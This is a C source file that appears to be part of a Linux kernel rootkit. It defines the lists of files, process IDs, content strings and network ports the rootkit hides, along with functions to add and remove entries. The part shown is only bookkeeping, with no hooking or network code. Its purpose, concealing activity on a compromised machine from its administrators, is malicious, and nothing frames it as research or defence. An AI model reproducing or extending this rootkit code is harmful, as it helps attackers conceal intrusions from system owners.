// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"

/* String-keyed target arrays */
char hidden_files[RK_MAX_TARGETS][RK_TARGET_LEN];
int file_count;

char hidden_pids[RK_MAX_TARGETS][RK_TARGET_LEN];
int pid_count;

char hidden_contents[RK_MAX_TARGETS][RK_TARGET_LEN];
int content_count;

/* Port target array */
unsigned short hidden_ports[RK_MAX_TARGETS];
int port_count;

int rk_target_add(char targets[][RK_TARGET_LEN], int *count,
		  const char *value)
{
	if (*count >= RK_MAX_TARGETS)
		return -ENOSPC;
	if (strlen(value) >= RK_TARGET_LEN)
		return -ENAMETOOLONG;
	strscpy(targets[*count], value, RK_TARGET_LEN);
	(*count)++;
	return 0;
}

int rk_target_remove_at(char targets[][RK_TARGET_LEN], int *count, int idx)
{
	int j;

	if (idx < 0 || idx >= *count)
		return -EINVAL;
	for (j = idx; j < *count - 1; j++)
		strscpy(targets[j], targets[j + 1], RK_TARGET_LEN);
	(*count)--;
	return 0;
}

int rk_target_remove(char targets[][RK_TARGET_LEN], int *count,
		     const char *value)
{
	int i;

	for (i = 0; i < *count; i++) {
		if (strcmp(targets[i], value) == 0)
			return rk_target_remove_at(targets, count, i);
	}
	return -ENOENT;
}

int rk_port_add(unsigned short port)
{
	if (port_count >= RK_MAX_TARGETS)
		return -ENOSPC;
	hidden_ports[port_count] = port;
	port_count++;
	return 0;
}

void rk_port_remove_at(int idx)
{
	int j;

	if (idx < 0 || idx >= port_count)
		return;
	for (j = idx; j < port_count - 1; j++)
		hidden_ports[j] = hidden_ports[j + 1];
	port_count--;
}

int rk_port_remove(unsigned short port)
{
	int i;

	for (i = 0; i < port_count; i++) {
		if (hidden_ports[i] == port) {
			rk_port_remove_at(i);
			return 0;
		}
	}
	return -ENOENT;
}
